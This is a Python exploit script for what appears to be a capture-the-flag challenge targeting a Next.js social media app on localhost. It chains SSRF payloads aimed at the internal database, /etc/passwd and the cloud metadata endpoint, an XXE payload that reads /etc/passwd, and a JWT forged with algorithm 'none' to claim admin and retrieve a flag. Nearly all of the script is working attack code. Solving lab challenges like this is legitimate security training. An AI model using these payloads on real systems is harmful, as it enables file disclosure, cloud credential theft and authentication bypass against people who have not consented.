#!/usr/bin/env python3
"""
Exploit script for Challenge 4: Next.js Social Media App
Chains SSRF + XXE + JWT
"""

import requests
import jwt

BASE_URL = "http://localhost:3000"

def exploit_ssrf():
    """Exploit SSRF"""
    print("[*] Attempting SSRF...")
    
    payloads = [
        "http://127.0.0.1:5432/",
        "http://localhost:5432/",
        "file:///etc/passwd",
        "http://169.254.169.254/latest/meta-data/"
    ]
    
    for url in payloads:
        print(f"[*] Trying SSRF with: {url}")
        try:
            response = requests.post(
                f"{BASE_URL}/api/fetch-url",
                json={"url": url},
                timeout=3
            )
            print(f"[+] Response: {response.text[:200]}")
        except Exception as e:
            print(f"[-] Error: {e}")

def exploit_xxe():
    """Exploit XXE"""
    print("[*] Attempting XXE...")
    
    xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"""
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/upload-xml",
            json={"xml": xxe_payload},
            timeout=3
        )
        print(f"[+] Response: {response.text[:500]}")
    except Exception as e:
        print(f"[-] Error: {e}")

def exploit_jwt():
    """Exploit JWT to get flag"""
    print("[*] Attempting JWT algorithm confusion...")
    
    payload = {
        'id': 'admin',
        'username': 'admin',
        'role': 'admin'
    }
    
    try:
        token = jwt.encode(payload, '', algorithm='none')
        print(f"[+] Created JWT: {token[:50]}...")
        
        headers = {'Authorization': f'Bearer {token}'}
        response = requests.get(f"{BASE_URL}/api/admin/flag", headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            flag = data.get('flag')
            print(f"[+] FLAG FOUND: {flag}")
            return flag
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return None

def main():
    print("=" * 60)
    print("Challenge 4: Next.js Social Media App Exploit")
    print("=" * 60)
    
    exploit_ssrf()
    exploit_xxe()
    exploit_jwt()

if __name__ == "__main__":
    main()

